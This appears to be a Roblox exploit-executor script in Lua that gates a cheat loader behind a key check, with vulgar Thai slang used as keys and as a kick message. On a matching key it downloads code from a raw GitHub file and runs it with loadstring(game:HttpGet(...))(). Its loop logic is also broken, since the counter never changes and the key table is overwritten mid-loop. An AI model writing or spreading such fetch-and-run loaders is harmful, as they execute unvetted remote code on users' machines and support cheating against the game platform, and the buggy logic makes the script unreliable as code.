
(getgenv()).Key = ""

local keys = {
     "ควย",
     "ควย6"
}

local counter = 1
local keyCheck
for i,v in pairs(keys) do
    if counter == #keys then
        keys = "ควย6"
        game.Players.LocalPlayer:Kick("ควยสะเก็ดขี้")
    else
        if v == getgenv().Key then 
            -- check succes
            print("คีย์ถูก")
            loadstring(game:HttpGet("https://raw.githubusercontent.com/MKXhup12/ddd/main/README.md"))()
        end
    end
end
